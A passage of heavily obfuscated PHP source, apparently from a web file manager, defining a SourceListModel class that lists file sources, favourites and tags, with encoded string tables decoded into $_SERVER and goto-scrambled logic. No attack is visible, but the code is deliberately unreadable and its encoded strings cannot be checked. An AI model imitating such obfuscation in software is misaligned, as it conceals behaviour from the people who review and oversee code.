')."\xc5\x44\xb8\xf8\x82\x1a\xe5\x82\x99\x2c\xd5\xc3\xce\x95\xb\x1e\x98\x7b\xe2\x36\x2f\xd2\x75\x72\x66\x66\x7e\x11\x58\xb9\x2b\x2e\x26\xe1\x99\x44\x1a\xb4\xf9\xf9\xdd\xe8\xc\xc0\xcd\xc5".base64_decode('RusNAjt0L4AULvZkQ1aOd0Ok4zsE+SZJaIWSCk6w+D42hbsy0GzwUSip6tyl+w==').base64_decode('woW4IsgULF6cDyMqNvYkT1a1gyDm2GFQ2OYwsNVZP4OxVszEITQP/uVl/C2NPA==')."\202\227\226\45\161\36\325\146\103\261\310\274\142\127\331\342\305\156\225\336\121\107\212\254\145\135\54\67\216\107\134\326\374\240\47\144\350\131\106\2\260\347\304\54\346\64"."\xb2\xf8\xe\x75\x97\x71\x7d\x79\x76\x17\x2d\xc1\xb\xea\xea\xea\x29\xf3\xd8\x35\x44\x3b\x4d\xa3\x7c\xa2\x5a\x31\x81\x4e\xff\x40\xd2\x19\x9e\xc5\x82\x75\x2d\x9c\x13\x66\x48\x8e\xe9\x89".base64_decode('Cx2UeKw+B2t6mOtxPKpi2JPNilHqgR8diafUmJutdnxM7opzxXGaBdEaGxxeJA==')."\xdb\x12\xa0\xb1\x26\x2\xf7\x0\x7a\x9\x18\xb3\x2e\x3b\x1c\xd4\xc5\x80\x2c\x30\xd9\x88\xeb\x6a\xd6\xb4\xd0\x29\xfc\xd4\x50\x11\x72\x16\xdf\x25\xf7\xc8\x38\x4b\x91\x44\x9f\x2e\x29\x42".base64_decode('rnGLAF3CKYQg8KZMhgRI0pVUdRFqrpFUFFAekZhCHwEFiyRKHdMyGzHd1MDeyA==').base64_decode('NKHJMw1tQaKH6mkh1xCE6zr9DPw7/HS2H8B3QVKKjpXtENVBF1Md/DSLvBrRGg==').base64_decode('DIQDddTxfqFjr0pmVYZ17rkoRBWhp3vnWHMwpsFNIGT69Vwmw27+IRfJdjZ8rQ==')."\x13\x4a\xe6\x4c\xbe\x27\x42\xcf\xb9\x61\x68\xa2\x63\x10\xb0\xe0\xf9\x9\xfa\x9d\x52\x12\x2e\x4b\xa4\x40\x36\x7c\xf3\xe\x2b\xa1\x6b\xc0\x72\x74\x81\xab\x4f\x69\xd4\xdf\xd5\xe8\xf2\xf2".base64_decode('cmd5BfjLbhwJG1ZF7WmFLOXlVegvTkAHrmQUrSlg0VJqQzL0KgppECHlaTWTow==')."\x9c\xd2\xbc\x3a\xa8\x84\x2e\xc1\xa6\xb5\x53\xe6\x80\xb6\x1f\xc\x20\xb2\x2a\xa2\xb\x7f\x92\x20\xdf\x4d\x92\xd0\x8d\x16\x89\x29\xf6\x41\x60\x57\x85\x64\x4a\xe8\xe\xa\x57\x3a\xd\x3"."\206\5\114\17\32\24\322\136\146\161\0\262\361\211\237\204\55\72\252\131\243\274\231\304\74\361\143\56\72\270\30\310\335\146\72\151\202\123\364\254\114\12\141\222\316\25"."\44\54\115\3\145\300\106\32\147\275\202\0\341\140\3\31\134\61\75\177\24\113\61\63\74\30\155\141\131\261\77\156\154\261\115\206\244\0\202\45\265\336\50\337\14\141".strrev('∞UEÇL‡‚›B¢ÅLYM[¨»‡◊&∑Ωbëd¢aë& ë™≈'."\r".'bÇ°ãt')."\x68\x3c\xcc\xf1\x38\xa0\x4d\x90\x35\xa6\x28\x80\xcf\xe0\xab\xf9\xb0\xbb\x38\xf2\x20\xf7\x97\xe8\xc9\x23\xac\x37\x53\x75\x68\xde\xec\x98\xf6\x99\x41\xc3\xae\x6b\xdc\xae\x27\xef\xed\x30"."\x1a\x13\xac\xdd\xe8\x59\x75\xe8\xbf\x28\x6d\x50\x88\x97\x2\xb0\x9a\x43\x1d\xf3\xa0\x25\x54\x60\x4f\xb2\x95\xf1\x24\x84\x67\xad\xc\xee\x3a\xab\x8e\x79\xc9\x13\xfd\x69\xe1\x6b\x61\x41".base64_decode('ecAgjmn5PTCto0cQTVxZXesEk2WIfQXw1sJglj0/Z4FMrENiPhEINZPoC0sE7w==').base64_decode('uIWQzN9+E7JyxwcC0Ko7JCTUMS//IhCKOuLNPzJ6tNYBZSgrhLXsN3CFyr4meQ==')."\x8d\x4b\xb0\xf5\x22\xd9\x38\x25\x80\xe7\x12\xe2\x9\xa9\xaa\x51\xa5\x2\x38\x1a\xfc\x82\xcf\xa\xc7\x30\x2c\x89\xc6\x45\x47\x99\x61\xa4\x42\x95\x52\xe8\x43\x60\x84\xdc\x20\xbc\x87\x15"."\x20\xe5\xb\xdb\x0\x72\x5c\x25\x8b\xad\xba\x5a\x2c\x66\x4d\xfb\x70\xe9\x9f\x69\x60\x15\xcd\x5\x87\x90\x1d\xa4\x89\xa7\xc8\x70\xf8\xa2\xe2\x21\x1\x5c\x74\x4d\xec\xfd\xa9\x2\x48\x67".base64_decode('Raw8DEJnzLCCKkafhBgQfyiHlKDtXZBTKFcnEDPJ5KSMEJ5wUtdMU7R69SQECg==')."\354\27\367\364\60\56\342\234\302\277\143\271\164\22\234\134\262\254\140\57\241\137\227\351\376\202\64\175\134\310\253\60\27\102\154\121\273\66\20\332\35\114\112\377\251\167".base64_decode('0Ax7IwJOZ0hQxijwBVKIFSGblK7ENR1Jo4KtYsYMKp1i1K8xKRxecigFqoA22g==')."\2\212\103\54\0\362\141\116\264\370\26\234\213\202\230\340\315\125\140\66\234\25\22\343\122\242\270\146\34\31\45\44\240\374\205\30\26\333\161\221\240\177\211\304\337\120"."\x2e\xc6\x4e\xe6\x6d\x6c\x4\x55\xe9\x94\xc4\x5d\x9a\xea\x68\xc2\xa\x90\x95\x30\xec\x81\x21\xa6\x81\x6a\xa1\x3b\x43\xde\x33\xb1\x8\xfa\x66\x5e\x11\x9c\x6\x77\x56\xae\xcc\x29\xa6\x18".strrev('Ä4o‰/åóÕíyÍ!Zı\'h≈g/ÖPØ–í$åüêÃ„Da$°OÅJx5CÇ^@')."\x5c\x38\xa5\x83\x44\x7b\x8b\xe4\xe3\x79\x34\xe1\x1d\x2a\x64\x51\xcb\xd\x17\x91\xf1\x30\x9b\x4f\x64\x65\xcc\x62\xba\xb0\x6f\x29\x4c\xb3\xb\x99\xdb\x8a\x64\x85\xdf\x3c\x63\x85\x2f\x98"."\xa1\xad\x50\x3a\x1e\x21\x98\x5c\x6f\xd1\x87\xb3\x65\x0\x2b\xc3\x9a\x4e\xbc\xc4\xa6\x2d\xef\x8a\x2\x3c\xb0\x28\x55\xd8\x2a\x21\x5e\x81\x45\x4f\xb8\xa8\x14\xef\x7\x57\x2d\x4\x20\xd".base64_decode('+6IVBobfoGNDZKoTyegSB4c1Bsy/hXcxnVBi7kIefCopheYuljOP5n5mtgBmsg==').base64_decode('G24STDHPECM0lSGnYYlgRRZLaQZiuXoVYrnCZPPWplY3A9XSYWIGqESw408IEQ==')."\25\57\142\72\322\13\306\135\353\45\13\254\256\212\351\366\320\167\112\173\323\152\134\362\7\32\175\165\36\177\275\57\64\135\202\236\7\270\176\1\362\374\154\135\356\350"."\270\12\117\16\305\374\30\163\176\14\203\316\30\140\74\235\11\306\216\33\234\361\26\124\176\204\267\15\254\325\142\34\125\364\274\32\1\33\237\266\22\4\124\6\36\302".base64_decode('Fcid4mdSQuasruTn71fQY6O8xUKBXIHWkPyFvwCWiDU32KyVzGCNVzM9qqFy4g==')."\x40\x4b\xf4\x8b\xb5\xf3\x63\x46\x9d\xf9\xdf\x4e\x88\xee\xba\x85\x19\xe0\x83\x8d\xbf\x92\xef\x6\x83\x38\x38\x10\x7d\xcf\xda\xc4\x66\x3c\x4d\xa2\xbf\x94\x2c\x3d\x57\x27\x2f\xe7\x70\xf"."\xf0\x28\x2a\xf8\xe6\xcf\xea\xb2\x6a\x28\x2\x0\x3b\x89\x2f\x23\x6a\xef\x72\x2a\x65\x79\x1a\x26\xd5\x21\x44\x73\xd6\x5d\xb6\xe0\xa7\xa2\xf8\x3\x14\x26\xb8\x64\x29\x94\x21\x8\x9f\xf2"."\374\137\67\125\115\160\257\14\152\202\136\341\63\125\177\354\366\270\116\174\73\210\176\63\357\375\201\377\372\222\201\203\337\104\104\221\241\74\175\36\4\75\140\114\256\131"."\xd8\x15\x76\x14\x7b\x1d\xe3\x9f\x0\x72\x9d\xde\x9f\x15\xaf\x82\xdc\x9\x37\x1b\x62\x1c\x80\x1e\x60\xbc\xf4\xc0\x17\x46\x38\x93\xc\xb3\x93\xda\xe0\xe7\xb0\x98\x4\x84\x36\x78\x27\x42"."\331\151\172\332\2\350\1\31\147\313\125\250\355\115\6\273\306\237\345\301\316\274\157\100\35\254\301\353\1\345\44\176\24\301\62\110\325\122\71\72\341\342\317\164\110\223"."\xa9\xa9\x11\xff\x4\xf2\xfa\xe0\x4d\x67\x4d\x8b\x24\xd8\x24\x6a\xec\xa\x43\x8c\x1\x88\x79\xe1\xdc\x3f\xd4\x27\xd1\xd2\xfd\x79\x0\xcb\x89\x84\x9f\xb6\x8b\xe9\x9c\x41\x17\xda\x99\xe"."\x4d\x1c\x6\x44\x3f\xa1\xfa\x35\x7e\x70\x6\x8b\x9c\xe\xc0\xbe\x2b\x66\xbe\x2b\x7e\x5c\xfc\xff\x52\x10\x27\x86\x4\x4d\x3c\x6b\x25\xf9\xd\x32\xec\xbb\x17\xe7\xa4\xe0\x2b\x3\x49\xad".base64_decode('1/r8DITY3xWwvCgg4D6yTxXfQKDe5wGTanlAQqhwBP6JkF+6p9irxlSEfL2UoQ==')."\112\235\345\275\161\1\320\254\160\351\21\225\202\132\1\62\175\301\214\76\136\40\140\31\173\317\200\75\66\303\27\50\172\303\244\176\220\174\66\260\144\165\300\316\375\332".base64_decode('8/3O6ouc3QMyzTCkoSd6lg9rYbnTgTktSKF4rLZfDIvKkKjTIJGe4yTYpE8RMg==')."\xd0\x47\x60\x12\xe\xf4\x42\x9\x26\x5b\xf6\x57\x70\x84\xe5\xc6\x68\xa1\x58\xba\x33\xa5\xc5\xe4\x54\x10\x2b\x17\x59\x34\xf6\x75\x20\x25\x31\x85\x41\x4b\x36\xc\x72\xcb\xd9\xec\xa0\x97".base64_decode('EBhILiRyGR+2BLNAdUEKE9VR8dULN4Ih2cHXWvFdC+m2WCW9/2KHkg3C85bu/A==')."\373\62\250\374\104\210\203\250\33\110\256\56\135\242\230\104\62\110\223\45\76\301\226\65\11\21\2\360\252\16\24\100\213\136\144\253\177\3\312\360\320\372\116\22\106\130".base64_decode('9FOvdDAZA8b5/irav/KrdPvbLPQz7KEZB+4ZfyULPyvjYE/IOLDPHwd5OMbBjQ==')."\x99\x7e\xeb\xa9\x25\xfe\x6a\x9d\xf5\xa9\x3b\xd8\x66\xa6\x4c\x97\xc7\xec\xdb\xf9\x7c\x36\x54\xb6\x2\x41\xfb\xc0\x85\xb5\xfc\xd3\x3f\x7e\x4b\x98\xc9\xa5\xf9\xbd\x2b\x88\x58\xe5\x9e\xbc"."\16\13\75\314\351\51\7\272\43\165\120\167\57\266\341\340\275\22\147\246\300\30\376\367\72\260\116\45\22\146\22\126\252\123\65\71\246\323\173\46\173\66\325\202\165\121".strrev('EÚ‚WÔQ%h¨óâ'."\0".'¬$KêˇäÍ˚¸¯'."\r".'N∆c—â“sÎﬁUÿ˝J·]').base64_decode('iVat1/yHnmyE+H+3ADjjjbMKOqj5r77lDQTCRUFzQ9jGbHfwGrwaN/gqwhsXfw==')."\xde\xc9\xfa\x2d\xbc\x95\x17\xe8\x87\xb0\xfd\xf0\x5\x81\x5f\xd7\xd1\x52\x50\x84\x4d\xc3\x63\x58\x53\x97\xad\xb2\x58\x21\x91\x3\x8d\x4\x95\x6f\x54\xf4\x12\xa3\x62\x6f\x3b\x1a\x18\x72"."\130\301\223\5\231\104\254\321\324\354\47\55\260\70\334\236\320\101\137\40\223\42\233\55\264\325\344\113\113\240\54\377\213\11\244\142\7\226\120\270\6\106\201\236\273\247".base64_decode('UvJR4PUk4Rr7N9qNOS0mYjll0ykgpHA6p5gBNMGEZ+ESn7WvtupBMV5Hu0MaLA==')."\x53\x3e\xbb\x25\x3c\xb2\xc4\x3d\x56\x8\x8c\x16\x2c\x4d\x8d\xc2\x6\x11\x98\x29\x8d\x12\x9f\x8f\x32\x93\x5c\x22\xc0\x2b\xd4\xb2\x5a\x5\x9f\x72\xa2\x95\xc\xaa\x48\x5c\x6\xf9\x55\xa3"."\63\30\322\136\262\134\233\302\341\126\154\10\345\151\144\306\121\262\240\40\3\207\116\170\75\115\23\303\126\313\343\0\365\373\5\130\43\213\64\6\342\365\266\7\366\20"."\xc9\xb1\xbf\xba\x47\xfb\x8f\xd6\x39\xa7\x64\x82\x95\x9d\x45\x66\x60\x8f\xb2\x58\x64\x8\xc3\xfe\x3a\x11\x60\xa2\x44\x57\x7a\x20\xca\x30\x9c\x6c\x99\x84\xd6\x21\xf5\x64\xfc\x35\x87\xfd"."\xcd\xc5\xac\x60\x64\x6c\x7b\x25\x56\x38\xe\xb5\xbe\xff\x6a\x31\x46\x84\xbe\x15\x6c\xcb\x9a\x9a\x38\x1a\xb6\xf7\xc3\xb0\x57\x35\x1c\xa6\xfc\xf7\xff\xf3\x1b\x8c\xff\xbf\x9e\x5e\x1c\x5b"."\x4e\xf\xae\x2d\xef\xf3\x35\x12\xb6\x96\xf2\x60\x3\x82\x23\x45\x7c\x68\x6a\xeb\x87\x75\x63\x1c\x22\xa6\x12\xc\x75\x58\x62\x24\xc2\x17\x1c\xdc\x71\x5c\xb6\xa7\x70\x5d\x4c\x5f\x93\xfa"."\xe2\xa0\x2e\x3a\x64\x7a\x29\x23\xa7\x52\x7c\xab\xcd\x7b\xcd\xc\x60\x64\x37\x7b\x76\xab\x50\x24\xff\x19\x4d\xb\xf2\x51\x2e\x93\x37\x33\xa3\xc6\xbb\xb\x5c\x15\xc2\x29\xf0\x5b\x1d\xd"."\12\274\101\136\66\116\237\0\13\101\275\217\270\151\50\16\205\53\310\100\122\262\50\332\320\5\262\124\14\53\45\224\270\175\52\45\37\310\52\227\120\21\221\162\130\100".base64_decode('efQmbNkFLUBxePjbsy7r66ekRLPtVSmcyRDH1nJinX9znF+aLWaxCNRftR7csA==')."\47\67\313\355\157\160\126\70\363\77\206\325\307\341\241\103\20\212\371\24\41\321\245\6\272\164\54\120\6\57\313\20\317\63\10\372\27\136\204\354\301\124\56\353\302\220".base64_decode('2F+6mFt1DTFgVig7+hD0AoX3H/NecLNdDgChiN+WqRpyK0q6HWprLkEWEARTAQ==').base64_decode('Ty88+myms/hITNxDqXmRoLlLQJaDK0N0lmwtCXWxrStlSqFscU03hGwMXigvfA==').base64_decode('JM+0jCb39Wr38YoEYCzTWkRbcjUpgoSbO8DeJqyem1EiAlOPVvQlcH73ZL36Yw==').base64_decode('rjTzKFVO9QvJqBR1jwJ+oZmVj9udo2R8Yu7pkU16gWYvZX1LU7gojCPc8ebfBQ==')."\361\53\52\141\363\247\305\240\10\302\151\255\15\56\20\177\116\355\344\36\176\375\303\271\337\104\202\275\344\152\311\232\240\374\77\203\2\10\177\364\25\362\72\202\345\46"."\327\4\126\172\355\117\361\271\104\153\117\113\306\174\50\267\354\24\312\363\233\0\336\115\10\53\324\175\264\144\254\305\105\313\121\206\124\34\204\335\376\62\25\32\101\322".strrev('PúQ?˚÷µ#‚%∑tgÇvM®úLÉ»ÕçñU;Vì¸œIÖw∑\\ÔJÄ').base64_decode('QEn5herEu8FBC4QKf4RjpXWIBZtenkA3K80y+AKxYx0jOYNioqU59qlFbD9HXw==')."\xc\x4c\xa3\xe3\x4e\x9c\xe6\xb1\x26\xe1\xfc\x8a\xad\xf5\x62\x1\x7b\xcf\x70\x9\xa3\x57\x35\xe3\x49\x41\x16\xc9\x4f\xcc\x87\xeb\x79\x83\x4a\x3e\x54\xb8\xbd\xf6\x56\xd1\x31\xb5\x4b\x68"."\xbc\x92\xbc\xf6\x8\xa\x6\x61\xad\x40\x19\xdc\xa2\x82\xc5\x70\x12\x7a\x4a\x9d\xf1\x90\x96\xb2\x83\xc\x1\x2c\x8b\x93\x60\xd9\xbc\x64\x5a\x58\x38\xd0\x10\xca\x99\x72\xce\x18\xa4\x7b"."\371\203\107\244\374\104\201\16\333\144\141\234\165\260\361\54\230\71\377\163\4\343\354\271\321\261\100\341\126\160\151\336\166\211\133\250\25\5\63\17\332\212\2\317\103\23"."\x4f\x61\x5\x68\x2d\x4d\x29\x40\x5d\xf9\x8d\x7f\x3e\x1d\xe7\x69\x5\xf4\xf\x70\x9d\x70\x8f\x16\x1d\xd3\x14\x48\x16\x95\x19\xa\xab\x3b\x4\xb\x2e\x7d\xc3\xaa\x87\x60\x83\x8b\x3\x43".strrev('=±2†¥ßA935õWó>À¬=ï1Pcö‡ë6ÿ—ù”.zHXGw¥ü∆ƒÄíu')."\72\237\47\311\246\144\172\76\56\150\141\143\251\105\63\325\270\240\13\305\65\122\131\67\125\316\306\247\204\3\70\333\331\27\227\366\55\327\341\5\116\207\20\210\260\153".base64_decode('/KjZopOO939yxo5v2urgxSy7XoHilQPvlzg5pOmmA6aFtSz6rdVMk18gYxkaMQ==')."\171\160\323\163\10\172\20\40\304\357\122\340\50\242\343\175\204\216\210\154\240\40\271\363\203\2\147\110\301\251\210\330\130\42\360\332\200\105\304\75\215\334\375\65\344\154"."\xb7\x93\x1c\x0\x84\xc8\x98\xd6\x47\xbd\xc0\x41\x73\x58\xde\x1e\xfe\x76\xaf\x6c\x67\xe4\x38\xf\x42\xf0\x4d\xd4\xea\x40\x46\xc7\x86\x1b\xa7\xb8\x89\xff\x5c\x27\xaa\xc3\x49\xfc\xab\x74"."\145\73\55\305\261\323\176\246\315\370\133\65\220\263\111\136\5\366\253\211\216\225\240\207\131\357\154\137\50\34\312\113\152\365\204\102\263\2\301\172\354\206\63\57\31\225"."\x12\x14\x68\xf2\x92\x5a\x9b\x2\x2d\x83\xa5\x79\x9b\x3d\x3e\x7f\x5e\x1a\x54\xa8\x69\x89\x72\x37\x41\x38\xc9\xd7\x8a\x5a\xe9\xf1\xfb\x3\xb3\x6\x6b\x85\xaf\x6e\x3a\x6f\x9\xba\x50\xe5"."\107\336\331\244\106\117\262\351\315\100\110\116\121\131\132\60\223\123\322\334\137\24\57\143\75\42\20\347\325\240\256\324\130\300\352\254\336\246\333\106\21\226\124\4\225\141"."\x5a\x48\xdd\xc1\x2c\x81\x42\xb7\xa4\x6c\x71\x33\x66\x19\x75\xc8\xae\x43\xa7\xa\xeb\x0\x5f\x1f\xbb\x2c\xd7\xcc\x2\x1c\x2d\x1c\x44\x6e\x4\x84\x14\x77\x5a\x4\x28\x2b\x38\x7a\xe2\x59".strrev(''."\0".''."\0".'ü≠Ai=˛I0·Ch-„#c±r«ª8LZ]X™#M=[£ÂJ>Ÿ˛j')."", 10, -8))); goto c£Ω¢¨‡ôµ; DÚÔÓîõ¬ü: class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\x75\x72\143\145"; protected $tableMeta = array("\164\141\x62\154\x65\116\141\155\145" => "\151\157\x5f\x73\157\165\x72\143\x65\137\x6d\145\x74\x61", "\155\x65\164\141\x46\x69\145\154\x64" => "\163\x6f\165\x72\x63\x65\x49\x44"); protected $dataAuto = array(array("\x6d\157\144\x69\x66\x79\124\151\155\x65", "\164\151\155\x65", "\x69\x6e\163\145\x72\164", "\x66\165\156\x63\x74\151\157\x6e"), array("\143\162\x65\x61\x74\145\x54\x69\x6d\x65", "\164\x69\x6d\x65", "\151\x6e\x73\x65\x72\x74", "\146\165\156\x63\x74\x69\157\x6e"), array("\166\151\145\x77\x54\x69\x6d\145", "\164\x69\155\145", "\151\x6e\x73\145\x72\164", "\x66\165\156\x63\x74\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($FÚ„Ã‘—ÌÌ) { return $this->listSource(array($_SERVER[™⁄»üÆ][395] => $FÚ„Ã‘—ÌÌ)); } public function typeName($F†Œ»¢Ó—‹) { static $DÏªŸÛè˜Í = array(self::TYPE_SYSTEM => "\163\171\x73\164\x65\x6d", self::TYPE_USER => "\x75\163\x65\162", self::TYPE_GROUP => "\147\162\x6f\165\x70"); return $DÏªŸÛè˜Í[$F†Œ»¢Ó—‹ . $_SERVER[™⁄»üÆ][33]]; } public function sourceListInfo($f»ÉùöÂÓü, $EÃ»åßüÖù = false) { goto cπ»ñÀ£ï®; cπ»ñÀ£ï®: $b“≠Ã–î«é =& $_SERVER[™⁄»üÆ]; $f»ÉùöÂÓü = $f»ÉùöÂÓü ? $f»ÉùöÂÓü : array(); $f»ÉùöÂÓü = array_filter(array_unique($f»ÉùöÂÓü)); goto dÖåü≤ıÖÙ; Aº£ÿ‚Ÿ«¬: return array_to_keyvalue($eóÒñ∆‘êŸ, $b“≠Ã–î«é[396]); goto Dò—∏ñ©Êû; dÖåü≤ıÖÙ: if (!$f»ÉùöÂÓü) { return array(); } $eóÒñ∆‘êŸ = $this->where(array($b“≠Ã–î«é[396] => array($b“≠Ã–î«é[7], $f»ÉùöÂÓü)))->select(); $this->_listDataApply($eóÒñ∆‘êŸ, $EÃ»åßüÖù); goto Aº£ÿ‚Ÿ«¬; Dò—∏ñ©Êû: } public function pathInfoFilter(&$añ≥ìõ·¯©) { goto DÔÓ¿‰®Ö†; aßéƒé–˜•: if ($añ≥ìõ·¯©[$CÏı¬Ó¯ŒÇ[404]] != 1) { $añ≥ìõ·¯©[$CÏı¬Ó¯ŒÇ[168]] = $añ≥ìõ·¯©[$CÏı¬Ó¯ŒÇ[406]]; unset($añ≥ìõ·¯©[$CÏı¬Ó¯ŒÇ[406]]); } $cÂâŸÆ‚„Î = $Bı⁄çè·¶¡; if (isset($añ≥ìõ·¯©[$CÏı¬Ó¯ŒÇ[407]]) && $añ≥ìõ·¯©[$CÏı¬Ó¯ŒÇ[407]][$CÏı¬Ó¯ŒÇ[408]] == -1) { $cÂâŸÆ‚„Î = $bÔÍõéê√ò; } goto AÁ¡‡Òªôë; DÔÓ¿‰®Ö†: $CÏı¬Ó¯ŒÇ =& $_SERVER[™⁄»üÆ]; static $Bı⁄çè·¶¡ = false; static $bÔÍõéê√ò = false; goto D≥˘®«¢ÍÀ; AÁ¡‡Òªôë: $añ≥ìõ·¯© = array_field_key($añ≥ìõ·¯©, $cÂâŸÆ‚„Î); return $añ≥ìõ·¯©; goto F˘«ÑÊ≈îÀ; D≥˘®«¢ÍÀ: static $Dú¥ûﬂ‹¥ÿ = false; if (!$Bı⁄çè·¶¡) { goto C®‰∫ÔÖãÉ; Cà¢”Áã˘ë: $D˜»«Ô≤¶ = $CÏı¬Ó¯ŒÇ[400]; $dÈπ¬´ûà¡ = explode($CÏı¬Ó¯ŒÇ[47], $D˜»«Ô≤¶); $Bı⁄çè·¶¡ = explode($CÏı¬Ó¯ŒÇ[47], $bëı˘êûâæ); goto fäËπŒÊéË; fäËπŒÊéË: $bÔÍõéê√ò = array(); foreach ($Bı⁄çè·¶¡ as $bà∆›≤⁄) { if (in_array($bà∆›≤⁄, $dÈπ¬´ûà¡)) { continue; } $bÔÍõéê√ò[] = $bà∆›≤⁄; } $Dú¥ûﬂ‹¥ÿ = explode($CÏı¬Ó¯ŒÇ[47], $CÏı¬Ó¯ŒÇ[401]); goto b›˜÷ú‘ù·; C®‰∫ÔÖãÉ: $bëı˘êûâæ = $CÏı¬Ó¯ŒÇ[397]; $bëı˘êûâæ .= $CÏı¬Ó¯ŒÇ[398]; $bëı˘êûâæ .= $CÏı¬Ó¯ŒÇ[399]; goto Cà¢”Áã˘ë; b›˜÷ú‘ù·: } foreach ($Dú¥ûﬂ‹¥ÿ as $aúº·Ë© ) { if (isset($añ≥ìõ·¯©[$aúº·Ë© ])) { $añ≥ìõ·¯©[$aúº·Ë© ] = intval($añ≥ìõ·¯©[$aúº·Ë© ]); } } goto f›ÓÚÌõÓ≠; f›ÓÚÌõÓ≠: $añ≥ìõ·¯©[$CÏı¬Ó¯ŒÇ[76]] = $CÏı¬Ó¯ŒÇ[402] . $añ≥ìõ·¯©[$CÏı¬Ó¯ŒÇ[396]] . $CÏı¬Ó¯ŒÇ[403]; $añ≥ìõ·¯©[$CÏı¬Ó¯ŒÇ[29]] = $añ≥ìõ·¯©[$CÏı¬Ó¯ŒÇ[404]] == 1 ? $CÏı¬Ó¯ŒÇ[77] : $CÏı¬Ó¯ŒÇ[193]; $añ≥ìõ·¯©[$CÏı¬Ó¯ŒÇ[405]] = $this->typeName($añ≥ìõ·¯©[$CÏı¬Ó¯ŒÇ[405]]); goto aßéƒé–˜•; F˘«ÑÊ≈îÀ: } public function listUserFav() { goto aËÌŸ‘ü∏›; aËÌŸ‘ü∏›: $f¯‡ÑÏΩˆó =& $_SERVER[™⁄»üÆ]; $BÃè¬†¢ÕÛ = Model($f¯‡ÑÏΩˆó[409])->listData(); $eÖØÙéÕåÆ = array_filter_by_field($BÃè¬†¢ÕÛ, $f¯‡ÑÏΩˆó[29], $f¯‡ÑÏΩˆó[410]); goto C©«•‚“ﬂÁ; C©«•‚“ﬂÁ: $eÖØÙéÕåÆ = array_to_keyvalue($eÖØÙéÕåÆ, $f¯‡ÑÏΩˆó[33], $f¯‡ÑÏΩˆó[76]); if ($eÖØÙéÕåÆ) { $CÑ∞µË≠˘… = $this->listSource(array($f¯‡ÑÏΩˆó[411] => array($f¯‡ÑÏΩˆó[412], $eÖØÙéÕåÆ))); } $CÑ∞µË≠˘… = array_to_keyvalue($CÑ∞µË≠˘…[$f¯‡ÑÏΩˆó[367]], $f¯‡ÑÏΩˆó[396]); goto b∑í“«ûúÊ; b∑í“«ûúÊ: foreach ($BÃè¬†¢ÕÛ as &$b«ÁÙŒ∑≠◊) { $b«ÁÙŒ∑≠◊ = array($f¯‡ÑÏΩˆó[413] => $b«ÁÙŒ∑≠◊[$f¯‡ÑÏΩˆó[394]], $f¯‡ÑÏΩˆó[414] => $b«ÁÙŒ∑≠◊[$f¯‡ÑÏΩˆó[28]], $f¯‡ÑÏΩˆó[415] => $b«ÁÙŒ∑≠◊[$f¯‡ÑÏΩˆó[76]], $f¯‡ÑÏΩˆó[416] => $b«ÁÙŒ∑≠◊[$f¯‡ÑÏΩˆó[29]], $f¯‡ÑÏΩˆó[417] => $b«ÁÙŒ∑≠◊[$f¯‡ÑÏΩˆó[194]], $f¯‡ÑÏΩˆó[418] => $b«ÁÙŒ∑≠◊[$f¯‡ÑÏΩˆó[84]]); if ($b«ÁÙŒ∑≠◊[$f¯‡ÑÏΩˆó[29]] == $f¯‡ÑÏΩˆó[410] && $CÑ∞µË≠˘…[$b«ÁÙŒ∑≠◊[$f¯‡ÑÏΩˆó[76]]]) { $b«ÁÙŒ∑≠◊[$f¯‡ÑÏΩˆó[85]] = $CÑ∞µË≠˘…[$b«ÁÙŒ∑≠◊[$f¯‡ÑÏΩˆó[76]]]; } } unset($b«ÁÙŒ∑≠◊); return $BÃè¬†¢ÕÛ; goto cÊÙﬁüâ∏˜; cÊÙﬁüâ∏˜: } public function listUserTag($EÔÿÔ∂…˜Ω) { goto dÙ◊ªâÆÚº; DÃ®ﬁÁ≤€ê: $Eß≠î°Íœ = array_to_keyvalue($aó·®◊ßÏñ[$D¿‚»˘ª·í[74]], $D¿‚»˘ª·í[33], $D¿‚»˘ª·í[396]); $AùË√ΩÈ¥æ = array_merge($Eß≠î°Íœ, $D⁄≠¯ÒÚò∞); foreach ($F∫ÿö»¢≤ò as $D–ŸÙ¨¢·Ó) { if (!in_array($D–ŸÙ¨¢·Ó, $AùË√ΩÈ¥æ)) { $Eâ‚Í¡«ê¶[] = $D–ŸÙ¨¢·Ó; } } goto EëÿêˆÑ£Ü; dî€°‡ŸÁ•: if (!$aó·®◊ßÏñ || count($F∫ÿö»¢≤ò) == $aó·®◊ßÏñ[$D¿‚»˘ª·í[364]][$D¿‚»˘ª·í[365]]) { return $aó·®◊ßÏñ; } $Eâ‚Í¡«ê¶ = array(); $D⁄≠¯ÒÚò∞ = array_to_keyvalue($aó·®◊ßÏñ[$D¿‚»˘ª·í[75]], $D¿‚»˘ª·í[33], $D¿‚»˘ª·í[396]); goto DÃ®ﬁÁ≤€ê; D–ÖÙ≤◊π‚: foreach ($eÀÚ„€Ωàº as $eΩÎìÁéÓ˜ => $e»ì©Û∂Êı) { $e©ŒÊ•ÕÕë = !0; if (!$EÔÿÔ∂…˜Ω) { $F∫ÿö»¢≤ò[] = $eΩÎìÁéÓ˜; continue; } foreach ($EÔÿÔ∂…˜Ω as $fÀáÈì‚ˆ≠) { if (!in_array($fÀáÈì‚ˆ≠, $e»ì©Û∂Êı)) { $e©ŒÊ•ÕÕë = !1; break; } } if ($e©ŒÊ•ÕÕë) { $F∫ÿö»¢≤ò[] = $eΩÎìÁéÓ˜; } } if (!$F∫ÿö»¢≤ò) { return array(); } $aó·®◊ßÏñ = $this->listSource(array($D¿‚»˘ª·í[411] => array($D¿‚»˘ª·í[412], $F∫ÿö»¢≤ò))); goto dî€°‡ŸÁ•; c®ùäπòøÑ: $eÀÚ„€Ωàº = array(); foreach ($b¡•⁄ıñí” as $D◊πÂ≤á∑ã) { $D–ŸÙ¨¢·Ó = $D◊πÂ≤á∑ã[$D¿‚»˘ª·í[76]]; if (!$D–ŸÙ¨¢·Ó) { continue; } if (!isset($eÀÚ„€Ωàº[$D–ŸÙ¨¢·Ó])) { $eÀÚ„€Ωàº[$D–ŸÙ¨¢·Ó] = array(); } $eÀÚ„€Ωàº[$D–ŸÙ¨¢·Ó][] = $D◊πÂ≤á∑ã[$D¿‚»˘ª·í[420]]; } $F∫ÿö»¢≤ò = array(); goto D–ÖÙ≤◊π‚; 